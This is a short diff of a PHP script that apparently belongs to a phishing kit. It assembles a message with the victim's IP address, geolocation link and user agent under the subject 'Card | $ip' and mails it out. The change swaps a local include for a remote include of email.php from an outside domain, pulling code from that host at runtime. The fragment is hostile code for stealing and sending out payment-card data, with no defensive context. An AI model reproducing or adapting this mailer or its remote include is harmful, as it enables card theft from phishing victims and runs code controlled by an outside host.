@@ -11,7 +11,7 @@ $message .= "|Client IP: ".$ip."\n";
 $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
 $message .= "User Agent : ".$useragent."\n";
 $message .= "|----------- unknown --------------|\n";
-include 'email.php';
+include 'https://bakersignsandbanners.com/base/email.php';
 $subject = "Card | $ip";
 {
 mail("$to", "$send", "$subject", $message);     
